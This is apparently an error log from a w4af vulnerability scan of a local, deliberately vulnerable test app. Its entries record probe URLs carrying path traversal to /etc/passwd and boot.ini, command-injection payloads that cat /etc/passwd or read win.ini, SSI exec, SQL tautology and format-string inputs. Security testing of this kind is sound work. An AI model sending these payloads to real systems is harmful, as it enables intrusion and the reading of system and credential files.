    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9642.trace&#34;&#34;. The request/response that generated the error is: 9642 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=70%20OR%2070%3D70%20OR%2070%3D70%20 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9643.trace&#34;&#34;. The request/response that generated the error is: 9643 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=70%20OR%2070%3D70%20OR%2070%3D70%20 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9644.trace&#34;&#34;. The request/response that generated the error is: 9644 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=hTtPs%3A%2F%2Fgithub.com%2Fw4af%2Fw4af 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9645.trace&#34;&#34;. The request/response that generated the error is: 9645 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=%0Atype%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9646.trace&#34;&#34;. The request/response that generated the error is: 9646 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=b%27UserInfo.json%5Cn%27%7Ctype%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9647.trace&#34;&#34;. The request/response that generated the error is: 9647 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=%7C%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9648.trace&#34;&#34;. The request/response that generated the error is: 9648 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=run%20type%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9652.trace&#34;&#34;. The request/response that generated the error is: 9652 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=%26%26%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9638.trace&#34;&#34;. The request/response that generated the error is: 9638 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=a%40a.aaaaaaaaaaaaaaaaaaaaX%21 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9650.trace&#34;&#34;. The request/response that generated the error is: 9650 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=%26%26type%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9651.trace&#34;&#34;. The request/response that generated the error is: 9651 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=%0D%0Atype%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9635.trace&#34;&#34;. The request/response that generated the error is: 9635 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=%60%2Fbin%2Fcat%20%2Fetc%2Fpasswd%60 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9653.trace&#34;&#34;. The request/response that generated the error is: 9653 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=aaaaaaaaaaaaaaaaaaaaX%21 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9654.trace&#34;&#34;. The request/response that generated the error is: 9654 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=b%27UserInfo.json%5Cn%27%7C%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9655.trace&#34;&#34;. The request/response that generated the error is: 9655 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=111111111111111111119%21 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9649.trace&#34;&#34;. The request/response that generated the error is: 9649 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=%3B%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9658.trace&#34;&#34;. The request/response that generated the error is: 9658 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=b%27UserInfo.json%5Cn%27%60%2Fbin%2Fcat%20%2Fetc%2Fpasswd%60 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9659.trace&#34;&#34;. The request/response that generated the error is: 9659 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=b%27UserInfo.json%5Cn%27run%20type%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9662.trace&#34;&#34;. The request/response that generated the error is: 9662 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=b%27UserInfo.json%5Cn%27%0D%0Atype%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9657.trace&#34;&#34;. The request/response that generated the error is: 9657 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=b%27UserInfo.json%5Cn%27%0D%0A%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9660.trace&#34;&#34;. The request/response that generated the error is: 9660 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=70%20OR%2070%3D70%20OR%2070%3D70%20 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9661.trace&#34;&#34;. The request/response that generated the error is: 9661 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName= 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9663.trace&#34;&#34;. The request/response that generated the error is: 9663 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=b%27UserInfo.json%5Cn%27%0Atype%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9688.trace&#34;&#34;. The request/response that generated the error is: 9688 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=%3Bvar%20cd%3Bvar%20d%3Dnew%20Date%28%29%3Bdo%7Bcd%3Dnew%20Date%28%29%3B%7Dwhile%28cd-d%3C8000%29 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9691.trace&#34;&#34;. The request/response that generated the error is: 9691 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9692.trace&#34;&#34;. The request/response that generated the error is: 9692 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9693.trace&#34;&#34;. The request/response that generated the error is: 9693 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=htTps%3A%2F%2Fw4af.net%2F 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9690.trace&#34;&#34;. The request/response that generated the error is: 9690 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=hTtp%3A%2F%2Fw4af.net%2F 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9689.trace&#34;&#34;. The request/response that generated the error is: 9689 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=fTp%3A%2F%2Fw4af.net%2F 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9694.trace&#34;&#34;. The request/response that generated the error is: 9694 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=%2F%2Fw4af.net 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9695.trace&#34;&#34;. The request/response that generated the error is: 9695 http://localhost/VulnerableApp/PathTraversal/LEVEL_9 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9700.trace&#34;&#34;. The request/response that generated the error is: 9700 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=w4af%0D%0Avulnerable073b%3A%20ae5cw4af 200&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=xjb76--%3Exjb76&#34;. Exception: &#34;[Errno 24] Too many open files&#34;. Generated 204 &#34;No Content&#34; response (id:9701)&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9803.trace&#34;&#34;. The request/response that generated the error is: 9803 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=yzdij%27yzdij 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9804.trace&#34;&#34;. The request/response that generated the error is: 9804 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=ewbrf%0Aewbrf 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9805.trace&#34;&#34;. The request/response that generated the error is: 9805 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=q8wuk%2A%2Fq8wuk 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9806.trace&#34;&#34;. The request/response that generated the error is: 9806 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=UserInfo.json%0A 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9807.trace&#34;&#34;. The request/response that generated the error is: 9807 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=5nufp%225nufp 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9808.trace&#34;&#34;. The request/response that generated the error is: 9808 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=46%22%20OR%20%2246%22%3D%2246%22%20OR%20%2246%22%3D%2246 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9809.trace&#34;&#34;. The request/response that generated the error is: 9809 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%3C%21-- 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9810.trace&#34;&#34;. The request/response that generated the error is: 9810 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=46%22%20OR%20%2246%22%3D%2246%22%20OR%20%2246%22%3D%2246 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9811.trace&#34;&#34;. The request/response that generated the error is: 9811 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=UserInfo.json%0A 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9812.trace&#34;&#34;. The request/response that generated the error is: 9812 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=UserInfo.json%0A 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9813.trace&#34;&#34;. The request/response that generated the error is: 9813 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=UserInfo.json%0A 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9814.trace&#34;&#34;. The request/response that generated the error is: 9814 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=UserInfo.json%0A 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9815.trace&#34;&#34;. The request/response that generated the error is: 9815 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%22 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9816.trace&#34;&#34;. The request/response that generated the error is: 9816 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=UserInfo.json%0A 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9817.trace&#34;&#34;. The request/response that generated the error is: 9817 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=UserInfo.json%0A 200&#39;</error>
    <error caller="threading">b&#39;The xpath plugin got an error while requesting &#34;http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=d%27z%220&#34;. Exception: &#34;[Errno 24] Too many open files&#34;. Generated 204 &#34;No Content&#34; response (id:9818)&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9819.trace&#34;&#34;. The request/response that generated the error is: 9819 http://localhost/VulnerableApp/PathTraversal/LEVEL_11?fileName=UserInfo.json%0A 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9820.trace&#34;&#34;. The request/response that generated the error is: 9820 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=UserInfo.json%0A 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9824.trace&#34;&#34;. The request/response that generated the error is: 9824 http://localhost/VulnerableApp/PathTraversal/LEVEL_10 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9831.trace&#34;&#34;. The request/response that generated the error is: 9831 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2Fetc%2Fpasswd%00.html 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9832.trace&#34;&#34;. The request/response that generated the error is: 9832 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2Fboot.ini%00 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9833.trace&#34;&#34;. The request/response that generated the error is: 9833 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=C%3A%5Cboot.ini%00 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9834.trace&#34;&#34;. The request/response that generated the error is: 9834 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%3C%21--%23set%20var%3D%22SEED_A%22%20value%3D%2211669%22%20--%3E%3C%21--%23echo%20var%3D%22SEED_A%22%20--%3E%3C%21--%23set%20var%3D%22SEED_B%22%20value%3D%2271464%22%20--%3E%3C%21--%23echo%20var%3D%22SEED_B%22%20--%3E 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9837.trace&#34;&#34;. The request/response that generated the error is: 9837 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%7Bmath%20equation%3D%22x%20%2A%20y%22%20x%3D62373%20y%3D53926%7D 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9838.trace&#34;&#34;. The request/response that generated the error is: 9838 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%7B46191%20%2A%2011337%7D 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9839.trace&#34;&#34;. The request/response that generated the error is: 9839 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9840.trace&#34;&#34;. The request/response that generated the error is: 9840 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%3C%21--%23exec%20cmd%3D%22echo%20-n%2041694%3Becho%20-n%2047492%22%20--%3E 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9841.trace&#34;&#34;. The request/response that generated the error is: 9841 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=htTps%3A%2F%2Fw4af.net%2F 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9842.trace&#34;&#34;. The request/response that generated the error is: 9842 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%2F%2Fw4af.net 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9845.trace&#34;&#34;. The request/response that generated the error is: 9845 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9846.trace&#34;&#34;. The request/response that generated the error is: 9846 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9847.trace&#34;&#34;. The request/response that generated the error is: 9847 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%2Fetc%2Fpasswd%00.html 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9850.trace&#34;&#34;. The request/response that generated the error is: 9850 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9902.trace&#34;&#34;. The request/response that generated the error is: 9902 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%3Bresponse.end%28%28new%20Array%285%2B1%29%29.join%28%27mgmqh%27%29%29 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9904.trace&#34;&#34;. The request/response that generated the error is: 9904 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=ping%20-c%209%20localhost 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9899.trace&#34;&#34;. The request/response that generated the error is: 9899 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName= 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9903.trace&#34;&#34;. The request/response that generated the error is: 9903 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=%3B%2Fusr%2Fsbin%2Fping%20-s%20localhost%209 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9906.trace&#34;&#34;. The request/response that generated the error is: 9906 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=ping%20-n%209%20localhost 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9907.trace&#34;&#34;. The request/response that generated the error is: 9907 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=%7Cping%20-n%209%20localhost 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9908.trace&#34;&#34;. The request/response that generated the error is: 9908 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=%0Aping%20-n%209%20localhost 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9920.trace&#34;&#34;. The request/response that generated the error is: 9920 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=%7Cping%20-n%209%20localhost 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9922.trace&#34;&#34;. The request/response that generated the error is: 9922 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=%7C%2Fusr%2Fsbin%2Fping%20-s%20localhost%209 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9921.trace&#34;&#34;. The request/response that generated the error is: 9921 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=%26%26ping%20-c%209%20localhost 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9959.trace&#34;&#34;. The request/response that generated the error is: 9959 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=github.com%2Fw4af%2Fw4af 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9962.trace&#34;&#34;. The request/response that generated the error is: 9962 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%3B%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
